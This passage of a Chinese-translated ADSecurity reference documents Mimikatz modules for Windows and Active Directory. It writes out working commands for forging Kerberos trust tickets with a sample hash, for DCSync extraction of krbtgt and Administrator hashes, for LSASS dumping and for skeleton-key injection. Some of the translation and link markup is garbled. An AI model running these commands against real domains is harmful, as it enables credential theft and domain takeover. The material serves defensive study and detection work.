<li>/ticket（可选） - 提供用于保存伪造的票证文件以供以后使用的路径和名称，或使用/ ptt立即将黄金票据注入内存以供使用。</li>
<li>/ ptt - 作为/ ticket的替代 - 使用它立即将伪造的票证注入内存以供使用。</li>
<li>/id（可选） - 用户RID。Mimikatz默认值为500（默认管理员帐户RID）。</li>
<li>/ startoffset（可选） - 票证可用时的起始偏移量（如果使用此选项，通常设置为-10或0）。Mimikatz默认值为0。</li>
<li>/ endin（可选） - 票证生命周期。Mimikatz默认值为10年（约5,262,480分钟）。Active Directory默认Kerberos策略设置为10小时（600分钟）。</li>
<li>/renewmax（可选） - 续订时的最长票证有效期。Mimikatz默认值为10年（约5,262,480分钟）。Active Directory默认Kerberos策略设置为7天（10,080分钟）。</li>
<li>/ aes128 - AES128密钥</li>
<li>/ aes256 - AES256密钥</li>
</ul>
<p>Trust Ticket特定的必需参数：</p>
<ul>
<li>/target - 目标域的FQDN。</li>
<li>/service - 在目标域（krbtgt）中运行的kerberos服务。</li>
<li>/rc4 - 服务kerberos服务帐户（krbtgt）的NTLM哈希。</li>
<li>/ticket - 提供用于保存伪造的票证文件以供以后使用的路径和名称，或使用/ ptt立即将黄金票据注入内存以供使用。</li>
</ul>
<p>信任票默认组：</p>
<ul>
<li>域用户SID：S-1-5-21 <domainid> -513</domainid></li>
<li>域管理员SID：S-1-5-21 <domainid> -512</domainid></li>
<li>架构管理员SID：S-1-5-21 <domainid> -518</domainid></li>
<li>企业管理员SID：S-1-5-21 <domainid> -519（仅当在林根域中创建伪造票证时才有效，但为AD林管理员权限添加使用/ sids参数）</domainid></li>
<li>组策略创建者所有者SID：S-1-5-21 <domainid> -520</domainid></li>
</ul>
<p><em>Mimikatz“Kerberos::golden /domain:child.lab.adsecurity.org / sid：S-1-5-21-3677078698-724690114-1972670770 **/ sids：S-1-5-21-1581655573-3923512380-696647894-519** / rc4：49ed1653275f78846ff06de1a02386fd / user：DarthVader / service：krbtgt /target:lab.adsecurity.org /ticket:c:\temp\tickets\EA-ADSECLABCHILD.kirbi“exit</em></p>
<p>注意：使用/ sids参数将为目标AD域创建一个信任票证，表明持有者是企业管理员。</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Mimikatz-Create-GoldenTrustTicket-ADSECLAB-DarthVader-wSIDHistory.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Mimikatz-Create-GoldenTrustTicket-ADSECLAB-DarthVader-wSIDHistory.jpg" alt="TrustTicket-V2-Mimikatz  - 创建 -  GoldenTrustTicket-ADSECLAB  - 达斯·维达，wSIDHistory"></a></p>
<p>注意：<a href="https://adsecurity.org/?p=1515" target="_blank" rel="noopener">Mimikatz生成带有硬编码域值的Silver Tickets，可能会出现在某些事件中。与有效的Kerberos身份验证相比，与伪造的故障单相关的登录/注销事件中的域字段也可能存在异常。</a></p>
<p><strong>步骤3：使用在步骤2中创建的Trust Ticket文件获取目标域中目标服务的TGS。将TGS保存到文件中。</strong></p>
<p>生成的TGS通过在此示例中针对CIFS服务提供对父（根）域的域控制器的EA访问（但它可以针对任何目标）。</p>
<p><em>Asktgs c：\ temp \ tickets \ EA-ADSECLABCHILD.kirbi CIFS / ADSDC02.lab.adsecurity.org</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Kekeo-AskTGS-Get-CIFS-ADSDC02-with-EA-SIDHistory.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Kekeo-AskTGS-Get-CIFS-ADSDC02-with-EA-SIDHistory.jpg" alt="TrustTicket-V2-Kekeo-AskTGS-GET-CIFS-ADSDC02-与-EA-SID历史"></a></p>
<p><strong>步骤4：注入在步骤3中创建的TGS文件，然后使用欺骗权限访问目标服务。</strong></p>
<p><em>Kirbikator lsa c：\ temp \ tickets \ CIFS.ADSDC02.lab.adsecurity.org.kirbi</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Kekeo-Kibikator-Inject-CIFS-ADSDC02-with-EA-SIDHistory-ADSDC02-AdminShareAccess.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Kekeo-Kibikator-Inject-CIFS-ADSDC02-with-EA-SIDHistory-ADSDC02-AdminShareAccess.jpg" alt="TrustTicket-V2-Kekeo-Kibikator-进样，CIFS，ADSDC02-与-EA-SID历史-ADSDC02-AdminShareAccess"></a></p>
<p><strong>KERBEROS::Hash</strong> - 密钥的哈希密码</p>
<p><strong>KERBEROS::List -</strong>列出用户内存中的所有用户票证（TGT和TGS）。不需要特殊权限，因为它只显示当前用户的票证。与“klist”的功能类似。</p>
<ul>
<li>/ export - 导出文件的用户票证。</li>
</ul>
<p>使用<a href="https://adsecurity.org/?page_id=1821#SEKURLSATickets" target="_blank" rel="noopener">SEKURLSA::TICKETS</a>为系统上所有经过身份验证的用户转储Kerberos票证。<br>请注意，在某些情况下，用户证书将不会导出。这需要运行SEKURLSA::Tickets / export（具有适当的权限）。<br><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png" alt="Mimikatz-Kerberos的清除"></a></p>
<p><strong>KERBEROS::PTC</strong> - 传递缓存（NT6）<br>* Nix系统，如Mac OS，Linux，BSD，Unix等缓存Kerberos凭据。可以使用Mimikatz复制和传递此缓存数据。对于在ccache文件中注入Kerberos票证也很有用。</p>
<p>Mimikatz的kerberos::ptc的一个很好的例子就是<a href="https://adsecurity.org/?p=676" target="_blank" rel="noopener">利用PyKEK开发MS14-068</a>。PyKEK生成一个ccache文件，可以使用kerberos::ptc向Mimikatz注入。</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-PTC-PyKEK-ccacheFile.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-PTC-PyKEK-ccacheFile.jpg" alt="Mimikatz-PTC-PyKEK-ccacheFile"></a></p>
<p><strong>KERBEROS::PTT</strong> - 传递票证<a href="https://adsecurity.org/?p=1667" target="_blank" rel="noopener">找到Kerberos</a>票证<br>后，可以将其复制到另一个系统并传递到当前会话，有效地模拟登录，而无需与域控制器进行任何通信。无需特殊权利。 与SEKURLSA::PTH（Pass-The-Hash）相似。</p>
<ul>
<li>/ filename - 票证的文件名（可以是多个）</li>
<li>/ diretory - 一个目录路径，将注入所有.kirbi文件。</li>
</ul>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2.png" alt="KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2"></a></p>
<p><strong>KERBEROS::Purge</strong> - 清除所有Kerberos票证<br>类似于“klist purge”的功能。在传递票证（PTC，PTT等）之前运行此命令以确保使用正确的用户上下文。</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png" alt="Mimikatz-Kerberos的清除"></a></p>
<p><strong>KERBEROS::TGT</strong> - 为当前用户获取当前的TGT。</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-TGT.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-TGT.png" alt="Mimikatz-Kerberos的TGT"></a></p>
<h4 id="LSADUMP"><a href="#LSADUMP" class="headerlink" title="LSADUMP"></a><strong>LSADUMP</strong></h4><p>LSADUMP Mimikatz模块与Windows本地安全机构（LSA）交互以提取凭据。这些命令中的大多数都需要debug权限（privlege::debug）或本地系统。默认情况下，Administrators组具有“debug”权限。debug仍然必须通过运行“privilege::debug”来“激活”。</p>
<p><strong>LSADUMP::Backupkeys</strong>需要管理员权限。</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-BackupKeys.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-BackupKeys.png" alt="Mimikatz-LSADump-BackupKeys"></a></p>
<p><strong>LSADUMP::Cache</strong> - 获取SysKey解密NL $ KM然后MSCache（v2）（来自注册表或配置单元）<br>需要管理员权限。</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Cache.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Cache.png" alt="Mimikatz-LSADump-缓存"></a></p>
<p><strong>LSADUMP::ChangeNTLM</strong>  - 要求服务器为一个用户设置新密码/ ntlm。</p>
<p><strong>LSADUMP::DCShadow</strong> - 将复制更改推送到域控制器。在<a href="https://www.dcshadow.com/" target="_blank" rel="noopener"> DCShadow.com上</a>阅读更多<a href="https://www.dcshadow.com/" target="_blank" rel="noopener">内容</a>。<br>这需要完整的AD管理员权限或KRBTGT pw哈希。<br>DCShadow临时将计算机设置为“DC”以进行复制：</p>
<ul>
<li>在AD林配置分区中创建2个对象。</li>
<li>更新用于包含“GC”（全局编录）和“E3514235-4B06-11D1-AB04-00C04FC2DCD2”（AD复制）的计算机的SPN。有关<a href="https://adsecurity.org/?page_id=183" target="_blank" rel="noopener">ADSecurity SPN部分</a>中的Kerberos服务主体名称的更多信息。</li>
<li>通过DrsReplicaAdd和KCC将更新推送到DC。</li>
<li>从配置分区中删除创建的对象。</li>
</ul>
<p><img src="https://adsecurity.org/wp-content/uploads/2018/02/DCShadow-init-01-1.jpg" alt="img"></p>
<p><img src="https://adsecurity.org/wp-content/uploads/2018/02/DCShadow-Push.jpg" alt="img"></p>
<p>配置分区中的临时DC对象<img src="https://adsecurity.org/wp-content/uploads/2018/02/DCShadow-ConfigurationContainerChange-01.jpg" alt="img"></p>
<p><a href="https://adsecurity.org/?p=1729" target="_blank" rel="noopener"><strong>LSADUMP::DCSync</strong></a> - 要求DC同步对象（获取帐户的密码数据）<br><a href="https://adsecurity.org/?p=1729" target="_blank" rel="noopener">需要域管理员，域管理员或自定义委派的成员身份。</a></p>
<p>2015年8月Mimkatz增加的一个主要功能是“DCSync”，它有效地“模仿”域控制器并从目标域控制器请求帐户密码数据。DCSync由Benjamin Delpy和Vincent Le Toux编写。从Mimikatz版本2.1 alpha 20160501开始，DCSync与重命名的域一起使用。</p>
<p>DCSync之前的漏洞利用方法是在域控制器上运行Mimikatz或Invoke-Mimikatz以获取KRBTGT密码哈希以创建黄金票证。借助Mimikatz的DCSync和相应的权限，攻击者可以通过网络从域控制器提取密码哈希以及以前的密码哈希，而无需交互式登录或复制Active Directory数据库文件（ntds.dit）。</p>
<p>运行DCSync需要特殊权限。管理员，域管理员或企业管理员以及域控制器计算机帐户的任何成员都可以运行DCSync来提取密码数据。请注意，默认情况下，只允许只读域控制器为用户提取密码数据。</p>
<p><strong>DCSync的工作原理：</strong></p>
<ol>
<li>在指定的域名中发现域控制器。</li>
<li>请求域控制器通过<a href="https://msdn.microsoft.com/en-us/library/dd207691.aspx" target="_blank" rel="noopener">GetNCChanges</a>复制用户凭据（利用<a href="https://msdn.microsoft.com/en-us/library/cc228086.aspx" target="_blank" rel="noopener">目录复制服务（DRS）远程协议</a>）</li>
</ol>
<p>我之前已经为<a href="http://blogs.metcorpconsulting.com/tech/?p=923" target="_blank" rel="noopener">域控制器复制</a>完成了一些数据包捕获，并确定了域控制器如何复制的DC内部通信流程。</p>
<p>Samba Wiki描述了<a href="https://wiki.samba.org/index.php/DRSUAPI" target="_blank" rel="noopener">DSGetNCChanges函数</a>：</p>
<p><em>“当第一个想要从第二个获取AD对象更新时，客户端DC向服务器发送DSGetNCChanges请求。响应包含客户端必须应用于其NC副本的一组更新。… 当DC收到DSReplicaSync请求时，对于它复制的每个DC（存储在RepsFrom数据结构中），它执行复制周期，其行为类似于客户端，并向该DC发出DSGetNCChanges请求。因此它从它复制的每个DC中获取最新的AD对象。“</em></p>
<p><strong>DCSync选项：</strong></p>
<ul>
<li>/ all - DCSync为整个域提取数据。</li>
<li>/ user - 要为其提取数据的用户的用户ID或SID。</li>
<li>/ domain（可选） - Active Directory域的FQDN。Mimikatz将发现域中的DC以进行连接。如果未提供此参数，则Mimikatz默认为当前域。</li>
<li>/ csv - 导出到csv</li>
<li>/ dc（可选） - 指定您希望DCSync连接到的域控制器并收集数据。</li>
</ul>
<p>还有一个/ guid参数。</p>
<p><strong>DCSync命令示例：</strong></p>
<p>在rd.adsecurity.org域中<em>提取</em> KRBTGT用户帐户的密码数据：<br><em>Mimikatz“lsadump::dcsync /domain:rd.adsecurity.org / user：krbtgt”退出</em></p>
<p>在rd.adsecurity.org域中<em>提取</em>管理员用户帐户的密码数据：<br><em>Mimikatz“lsadump::dcsync /domain:rd.adsecurity.org/user：Administrator”退出</em></p>
<p>在lab.adsecurity.org域中提取ADSDC03域控制器计算机帐户的密码数据：<br><em>Mimikatz“lsadump::dcsync /domain:lab.adsecurity.org / user：adsdc03 $”退出</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-DCSync.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-DCSync.jpg" alt="Mimikatz-LSADump-DCSync"></a></p>
<p><strong>LSADUMP::LSA</strong> - 要求LSA Server检索SAM / AD企业（正常，动态补丁或注入）。使用/ patch作为数据子集，使用/ inject来处理所有事情。<em>需要系统或debug权限。</em></p>
<ul>
<li>/ inject - 注入LSASS以提取凭据</li>
<li>/ name - 目标用户帐户的帐户名称</li>
<li>/ id - 目标用户帐户的RID</li>
<li>/ patch - 补丁LSASS。</li>
</ul>
<p>通常，服务帐户是Domain Admins（或等效的）的成员，或者Domain Admin最近登录到计算机，攻击者从中转储凭据。使用这些凭据，攻击者可以访问域控制器并获取所有域凭据，包括用于创建Kerberos Golden Tickets的KRBTGT帐户NTLM哈希。</p>
<p>命令：mimikatz lsadump::lsa / inject exit</p>
<p>在域控制器上运行时，转储Active Directory域中的凭据数据。<br>需要管理员访问权限（具有debug权限）或本地系统权限</p>
<p>RID 502帐户是KRBTGT帐户，RID 500帐户是域的默认管理员。</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-LSA.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-LSA.png" alt="Mimikatz-LSADump-LSA"></a></p>
<p>这是运行LSADUMP::lsa / patch时的结果，它只转储NTLM密码哈希值。</p>
<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/InvokeMimikatz-DumpADdb-KRBTGT3.png" target="_blank" rel="noopener"><img src="http://adsecurity.org/wp-content/uploads/2015/01/InvokeMimikatz-DumpADdb-KRBTGT_thumb3.png" alt="InvokeMimikatz-DumpADdb-KRBTGT"></a></p>
<p><strong>LSADUMP::NetSync</strong></p>
<p>NetSync提供了一种使用DC计算机帐户密码数据通过Silver Ticket模拟域控制器和DCSync目标帐户信息（包括密码数据）的简单方法。</p>
<p><strong>LSADUMP::RpData</strong></p>
<p><strong>LSADUMP::SAM</strong> - 获取SysKey来解密SAM条目（来自注册表或配置单元）。SAM选项连接到本地安全帐户管理器（SAM）数据库并转储本地帐户的凭据。<br><em>需要系统或debug权限。</em><br>它包含用户密码的NTLM，有时还包含LM哈希。它可以在两种模式下工作：在线（使用SYSTEM用户或令牌）或离线（使用SYSTEM＆SAM配置单元或备份）。</p>
<p>在针对在线SAM运行时，需要管理员访问权限（具有debug权限）或本地系统权限。</p>
<p><em>获取模拟的SYSTEM令牌：Mimikatz“PRIVILEGE::Debug”“TOKEN::elevate”</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-SAM.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-SAM.png" alt="Mimikatz-LSADump-SAM"></a></p>
<p><strong>LSADUMP::Secrets</strong> - 获取SysKey来解密SECRETS条目（来自注册表或配置单元）。<br><em>需要系统或debug权限。</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Secrets.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Secrets.png" alt="Mimikatz-LSADump-秘密"></a></p>
<p><strong>LSADUMP::SetNTLM</strong>  - 要求服务器为一个用户设置一个新密码/ ntlm。</p>
<p><a href="https://adsecurity.org/?p=1588" target="_blank" rel="noopener"><strong>LSADUMP::Trust</strong></a> - 要求LSA Server检索Trust Auth信息（正常或动态补丁）。<br><em>需要系统或debug权限。</em></p>
<p>从Active Directory中提取数据以获取域的现有信任关系。还显示信任密钥（密码）。</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Trust.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Trust.png" alt="Mimikatz-LSADump信托"></a></p>
<h4 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a><strong>MISC</strong></h4><p>MISC Mimikatz模块对于那些不太适合其他地方的命令来说是一种全能。<br>这个模块中最着名的命令是MISC::AddSID，MISC::MemSSP和MISC::Skeleton。</p>
<p><a href="https://adsecurity.org/?p=1772" target="_blank" rel="noopener"><strong>MISC::AddSid</strong></a> - 将SIDHistory添加到用户帐户。第一个值是目标帐户，第二个值是帐户/组名称（或SID）。<br><em>需要系统或debug权限。</em></p>
<p><em>注意：ADDSID已移至2.1版本分支中的SID模块。</em><br><a href="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-AddSIDHistory-BobaFett-ADSADministrator1.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-AddSIDHistory-BobaFett-ADSADministrator1.png" alt="SneakyPersistence-AddSIDHistory-BobaFett-ADSADministrator"></a><a href="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-AddSIDHistory-GetUSerInfo-BobaFett1.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-AddSIDHistory-GetUSerInfo-BobaFett1.png" alt="SneakyPersistence-AddSIDHistory-GetUSerInfo-BobaFett"></a></p>
<p><strong>MISC::Cmd</strong> - 命令提示符（没有DisableCMD）。<br><em>需要管理员权限。</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-CMD.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-CMD.png" alt="Mimikatz-MISC-CMD"></a></p>
<p><strong>MISC::Compressme</strong> - 将Mimikatz文件压缩到一个名为“mimikatz_x64.compressed”的新文件</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-CompressMe.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-CompressMe.jpg" alt="Mimikatz-MISC-CompressMe"></a></p>
<p><strong>MISC::Detours</strong> - （<strong>*实验*</strong>）尝试使用类似Detours的钩子枚举所有模块<br><em>需要管理员权限。</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Detours.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Detours.png" alt="Mimikatz-MISC-走弯路"></a></p>
<p><strong>MISC::MemSSP</strong> - 通过使用新SSP在内存中修补LSASS来注入恶意Windows SSP以记录本地经过身份验证的凭据 - 无需重新启动（重新启动会清除memssp Mimikatz注入）。这篇<a href="https://adsecurity.org/?p=1760" target="_blank" rel="noopener">关于Mimikatz SSP的文章描述了内存中的修补以及更持久的SSP技术</a>。<br>需要管理员权限。<a href="https://dl.mandiant.com/EE/library/MIRcon2014/MIRcon_2014_IR_Track_Analysis_of_Malicious_SSP.pdf" target="_blank" rel="noopener">MemSSP上的Mandiant演示文稿</a>[</p>
<p>](<a href="https://dl.mandiant.com/EE/library/MIRcon2014/MIRcon_2014_IR_Track_Analysis_of_Malicious_SSP.pdf)[![SneakyPersistence-EnableMimiSSP-MemSSP-01](https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimiSSP-MemSSP-011.png)](https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimiSSP-MemSSP-011.png)[" target="_blank" rel="noopener">https://dl.mandiant.com/EE/library/MIRcon2014/MIRcon_2014_IR_Track_Analysis_of_Malicious_SSP.pdf)[![SneakyPersistence-EnableMimiSSP-MemSSP-01](https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimiSSP-MemSSP-011.png)](https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimiSSP-MemSSP-011.png)[</a></p>
<p>](<a href="https://dl.mandiant.com/EE/library/MIRcon2014/MIRcon_2014_IR_Track_Analysis_of_Malicious_SSP.pdf" target="_blank" rel="noopener">https://dl.mandiant.com/EE/library/MIRcon2014/MIRcon_2014_IR_Track_Analysis_of_Malicious_SSP.pdf</a>)</p>
<p><strong>MISC::MFLT</strong> - 收集有关加载的驱动程序的详细信息，包括驾驶员高度。<br>从Mimikatz v2.1.1开始（11/28/2017）。</p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Misc-Mflt-01.png" alt="img"></p>
<p><strong>MISC::Ncroutemon</strong> - Juniper Manager（不带DisableTaskMgr）</p>
<p><strong>MISC::Regedit</strong> - 注册表编辑器（不带DisableRegistryTools）<br><em>需要管理员权限。</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Regedit.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Regedit.jpg" alt="Mimikatz，杂项，注册表编辑器"></a></p>
<p><a href="https://adsecurity.org/?p=1275" target="_blank" rel="noopener"><strong>MISC::Skeleton</strong></a> - 在域控制器上将Skeleton Key注入LSASS进程。<br><em>需要管理员权限。</em><br>这使得对Skeleton Key修补DC的所有用户身份验证都可以使用“主密码”（也称为Skeleton Keys）以及通常的密码。<br><a href="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimikatzSkeleton.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimikatzSkeleton.png" alt="SneakyPersistence-EnableMimikatzSkeleton"></a></p>
<p><strong>MISC::Taskmgr</strong> - 任务管理器（没有DisableTaskMgr）。<br><em>需要管理员权限。</em><br><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Taskmgr.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Taskmgr.jpg" alt="Mimikatz-MISC-Taskmgr"></a></p>
<p><strong>MISC::Wifi -</strong>不再在MISC中。可能转移到DPAPI：可能包含类似功能的Wifi。</p>
<p><strong>MISC::WP</strong></p>
<h4 id="MINESWEEPER"><a href="#MINESWEEPER" class="headerlink" title="MINESWEEPER"></a><strong>MINESWEEPER</strong></h4><p><strong>MINESWEEPER::Infos</strong> - 在扫雷中提供地雷信息</p>
<h4 id="Net"><a href="#Net" class="headerlink" title="Net"></a><strong><strong>Net</strong></strong></h4><p><strong>NET ::alias</strong></p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Net-Alias.png" alt="img"></p>
<p><strong>NET ::group</strong></p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Net-Group.png" alt="img"></p>
<p><strong>NET::ServerInfo</strong></p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Net-ServerInfo.png" alt="img"></p>
<p><strong>NET::Session</strong></p>
<p><strong>NET ::share</strong></p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Net-Share.png" alt="img"></p>
<p><strong>NET ::stat</strong></p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Net-Stats.png" alt="img"></p>
<p><strong>NET::TOD</strong></p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Net-TOD.png" alt="img"></p>
<p><strong>NET ::user</strong></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Net-User.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Net-User.jpg" alt="Mimikatz-NET-用户"></a></p>
<p><strong>NET::WSession</strong></p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Net-WSession.png" alt="img"></p>
<h4 id="PRIVILEGE"><a href="#PRIVILEGE" class="headerlink" title="PRIVILEGE"></a>PRIVILEGE</h4><p><strong>PRIVILEGE ::</strong> <strong>Backup</strong> - 获取备份权限/权限。需要debug权限。</p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Privilege-Backup.png" alt="img"></p>
<p><strong>PRIVILEGE::Debug</strong> - 获取debug权限（许多Mimikatz命令需要此权限或本地系统权限）。<br>默认情况下，Administrators组具有“debug”权限。debug仍然必须通过运行“privilege::debug”来“激活”。</p>
<p><em>debug权限允许某人debug他们本来无法访问的进程。例如，作为用户运行的进程在其令牌上启用了debug权限，可以debug作为本地系统运行的服务。</em><br><em><a href="http://msdn.microsoft.com/library/windows/hardware/ff541528.aspx" target="_blank" rel="noopener">http://msdn.microsoft.com/library/windows/hardware/ff541528.aspx</a></em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Privilege-Debug.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Privilege-Debug.png" alt="Mimikatz特权，debug"></a></p>
<p>本杰明的备注：<br>错误kuhl_m_privilege_simple; RtlAdjustPrivilege（20）c0000061意味着客户端不持有所需的权限（主要是您不是管理员：smirk :)</p>
<p><strong>PRIVILEGE::Driver</strong> - 获取驱动程序权限/权限。需要debug权限。</p>
<p><strong>PRIVILEGE::ID</strong> - 按ID获取权限/权限。需要debug权限。</p>
<p><strong>PRIVILEGE::Name</strong> - 按<strong>名称</strong>获取权限/权限。需要debug权限。</p>
<p><strong>PRIVILEGE::Restore</strong> - 获取还原权限/权限。需要debug权限。</p>
<p><strong>PRIVILEGE::Security</strong> - 获取安全权限/权限。需要debug权限。</p>
<p><strong>PRIVILEGE::SysEnv</strong> - 获取管理系统环境的权限/权限。需要debug权限。</p>
<p><strong>PRIVILEGE::TCB</strong> - 获取TCB权限/权限（可能作为操作系统权限的一部分）。需要提升权利（仍然是TBD）。</p>
<h4 id="PROCESS"><a href="#PROCESS" class="headerlink" title="PROCESS"></a><strong>PROCESS</strong></h4><p>Mimikatz PROCESS模块提供了收集进程数据和与进程交互的能力。</p>
<p><strong>PROCESS::Exports</strong> - 列出导出</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Exports.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Exports.jpg" alt="Mimikatz进程-进出口"></a></p>
<p><strong>PROCESS::Imports</strong> - 列出导入</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Imports.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Imports.jpg" alt="Mimikatz进程-进口"></a></p>
<p><strong>PROCESS::List</strong> - 列出正在运行的进程<br>需要管理员权限。</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-List.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-List.jpg" alt="Mimikatz进程名录"></a></p>
<p><strong>PROCESS::Resume</strong> - 恢复进程</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Resume.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Resume.jpg" alt="Mimikatz进程 - 恢复"></a></p>
<p><strong>PROCESS::Run</strong>  - Run</p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Process-Run.png" alt="img"></p>
<p><strong>PROCESS::Start</strong> – 开始一个过程</p>
<p><strong>PROCESS::Stop</strong> – - 终止进程</p>
<p><strong>PROCESS::Suspend</strong> - 暂停进程</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Suspend.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Suspend.jpg" alt="Mimikatz进程挂起"></a></p>
<h4 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a><strong>RPC</strong></h4><p>RPC模块提供mimikatz的远程控制。</p>
<p><strong>RPC::Close</strong></p>
<p><strong>RPC::Connect</strong></p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-RPC-Connect.png" alt="img"></p>
<p><strong>RPC::Enum</strong></p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-RPC-Enum.png" alt="img"></p>
<p><strong>RPC::Server</strong></p>
